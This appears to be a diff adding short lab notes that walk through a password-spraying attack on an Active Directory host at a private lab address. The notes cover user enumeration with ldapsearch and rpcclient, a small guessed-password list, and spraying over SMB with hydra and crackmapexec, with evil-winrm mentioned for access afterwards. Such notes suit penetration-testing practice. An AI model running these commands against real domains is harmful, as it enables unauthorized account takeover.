@@ -1,0 +1,32 @@
+# 1) creating user files 
+From enumeration we allready gather the inforamation about the users 
+
+ldapsearch -H ldap://192.168.56.107 -x -b"DC=skypia,DC=org"  '(objectClass=User)' "sAMAccountName"| grep "sAMAccountName" 
+
+or 
+
+rpcclient -U "jemmie.blondell" 192.168.56.107
+
+and then typing enumdomuser
+
+I used ldapsearch and then saved only the username using this command:
+cut -d':' -f2 input_file > output_file
+
+# 2) Create a password file with a few passwords.
+
+I used since they are simmilar to the two passwords i already know:
+qwerty123
+happy
+summer
+passw0rd
+winter
+
+# 3) Running spraying attacks for differnet services
+
+hydra -L users.txt -P password.txt -s 445 smb://192.168.56.107
+
+crackmapexec smb 192.168.56.107 -u users.txt -p password.txt --continue-on-success
+
+# 4) repeat a couple of times.
+when you get the first password you can use evil-winrm
+
